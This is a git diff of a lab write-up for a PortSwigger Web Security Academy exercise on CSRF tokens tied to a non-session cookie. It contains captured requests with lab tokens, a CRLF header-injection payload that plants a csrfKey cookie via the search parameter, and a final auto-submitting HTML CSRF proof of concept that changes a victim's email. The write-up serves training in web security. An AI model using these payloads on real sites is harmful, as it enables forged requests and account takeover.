@@ -3,7 +3,6 @@
 ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9b0fa0fc-3538-47a6-9c76-28553367992f)
 
 
-
 ## Overview :
 
 **CSRF token is tied to a non-session cookie -**
@@ -37,16 +36,16 @@ If we update the email of wiener, browser sends a request like this.
 
 ```http
 POST /my-account/change-email HTTP/2
-Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
-Cookie: session=ZPFZy0o8QHUK2RTfyaHqKIAbc97aoQd; csrfKey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc
+Host: 0a4800d4041e203a80c1808900a400d7.web-security-academy.net
+Cookie: session=ENaW8l1JXay1VOycCiogD09ikVA4OUQL; csrfKey=o1jSFgrHJBIBK6IZt0fvXXuO14fGKSfc
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 60
-Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
-Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=wiener
+Content-Length: 59
+Origin: https://0a4800d4041e203a80c1808900a400d7.web-security-academy.net
+Referer: https://0a4800d4041e203a80c1808900a400d7.web-security-academy.net/my-account?id=wiener
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
@@ -55,12 +54,13 @@ Sec-Fetch-User: ?1
 Te: trailers
 Connection: close
 
-email=user1%40user.net&csrf=I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD
+email=user%40user.net&csrf=ePSGVOTHfJGqkk9DM1m6QhMVn96wdaiu
 ```
 
 We see that there is a **csrf token parameter in the body of the request & a csrfkey cookie in the header**. Both has two different values.
 
 
+#### Case 1 - Change session cookie value -
 
 If we change the cookie value, then we get logged out.
 
@@ -73,7 +73,7 @@ If we change the cookie value, then we get logged out.
 ```http
 POST /my-account/change-email HTTP/2
 Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
-Cookie: session=ittvGu6fBbmpHK5rPxvZDCGA8SEFOafP; csrfKey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc
+Cookie: session=4yvqWCiq0KAsmc5SWXhWNaimEGeFT3ye; csrfKey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -92,52 +92,64 @@ Te: trailers
 email=test%40test.com&csrf=I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD
 ```
 
-From this we can understand that system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync.
+From this we can understand that system providing the CSRF protection does not integrate into the session system, but **creates its own type of session that is not in sync**.
 
-**First let's login as wiener -**
+#### Check if csrf token is tied to csrf cookie -
 
-- On viewing the page source, we can find he csrf token of wiener - `I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD`
+- **Give any invalid csrf token**
 
-- Click on inspect element & we can see that in the cookies we have the csrfkey - `yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc`
+When we give random csrf token , we get a response stating that the token is invalid. Meaning that the csrfkey and csrf token are tied together.
+
+If the csrf token value is not matched with its pair ie(csrfkey) , then the application rejects the request.
 
 
-**Log in as carlos -**
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/dea63e45-b13f-402d-9031-b8c0b76bae5a)
 
-Open a incognito tab and login as carlos.
+- **Check if we can give any valid token (another user's token)**
 
-Update carlos's email & capture the request,
+Log in to carlos's account in incognito, & get his csrf token & csrfkey value.
 
-```http
-POST /my-account/change-email HTTP/2
-Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
-Cookie: session=cV2AxFTpez3Xml0BLiEx86RJUIXHDn7T; csrfKey=hCSFtEnq0dVU2t8DajouPWfooHhpPi2q
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 60
-Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
-Dnt: 1
-Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=carlos
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
+csrf token - `A3SRAhW10ulYAujS4LqoGMSAbVtJR1WY`
+csrfkey - `DeXLkdkNhCEpCDz5WHWqsRmLrAI6X3wz`
 
-email=test2%40test.net&csrf=FxkOmuSSG0XT01gCwdw8pDbTl1wcRGdW
-```
+Let's now try to give carlos's csrf token in place of wiener's.
 
-- Carlos's csrf token - `FxkOmuSSG0XT01gCwdw8pDbTl1wcRGdW`
-- Carlos's csrfkey - `hCSFtEnq0dVU2t8DajouPWfooHhpPi2q`
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/36817564-833a-4bc2-83c6-5c524c512f2d)
 
-If we replace only the csrf token & csrf key of carlos's with wiener, the request gets accepted & the email of carlos is changed as expected.
+This confirms that **both csrf token and cookie are strictly tied together**
 
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6451487d-2e12-4431-8748-f9e3f3b1c3fb)
+#### **Submit  both the csrf token and csrf key of another user**
 
-#### Inject csrfkey cookie value by HTTP header injection
+If we submit both the csrfkey and csrf token of carlos(another user), then the request is accepted & the email ID is changed.
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2e173d09-b64a-4679-942f-671da4c0b32e)
+
+
+> CONCLUSION - CSRF token and CSRFKEY cookie are tied together but both are not tied to session cookie !
+
+This happens when application uses 2 different frameworks , 1 for session handling and 1 for csrf token.
+
+
+
+
+
+### Inject csrfkey cookie value by HTTP header injection
+
+We need to find any functionality that takes user input. IN this case, we have a search functionality.
+
+If we search for any term , we can see from the response that the search we used is getting added as a cookie - `Set-Cookie: LastSearchTerm=hello`
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/15699775-2df8-4922-8c3c-c47762559c15)
+
+
+So with this we can try to inject the csrfkey value.
+
+Use this payload query in the search parameter of the request - `/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None` which decodes to `/?search=test Set-Cookie: csrfkey=<carlos csrfkey>; SameSite=None`
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9d2fedf6-68b0-4c4b-a36d-39c6be058b46)
+
+rom the response we can confirm that we can inject the csrfkey value by HTTP header injection.
+
 
 Send the above request to POC generator.
 
@@ -145,7 +157,7 @@ Send the above request to POC generator.
 
 
 ```html
-<img src="https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfkey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+<img src="https://0a4800d4041e203a80c1808900a400d7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=DeXLkdkNhCEpCDz5WHWqsRmLrAI6X3wz%3b%20SameSite=None" onerror="document.forms[0].submit()">
 ```
 
 **Final payload **
@@ -155,12 +167,16 @@ Send the above request to POC generator.
   <!-- CSRF PoC - generated by Burp Suite Professional -->
   <body>
   <script>history.pushState('', '', '/')</script>
-    <form action="https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="pwned&#64;user&#46;net" />
-      <input type="hidden" name="csrf" value="I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD" />
+    <form action="https://0a4800d4041e203a80c1808900a400d7.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="pwned&#64;test&#46;com" />
+      <input type="hidden" name="csrf" value="A3SRAhW10ulYAujS4LqoGMSAbVtJR1WY" />
       <input type="submit" value="Submit request" />
     </form>
-      <img src="https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfkey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+      <img src="https://0a4800d4041e203a80c1808900a400d7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=DeXLkdkNhCEpCDz5WHWqsRmLrAI6X3wz%3b%20SameSite=None" onerror="document.forms[0].submit()">
   </body>
 </html>
 ```
+
+Deliver the exploit to victim to solve the lab.
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/504f4c2c-247a-4db9-8e11-7d018d0622fb)
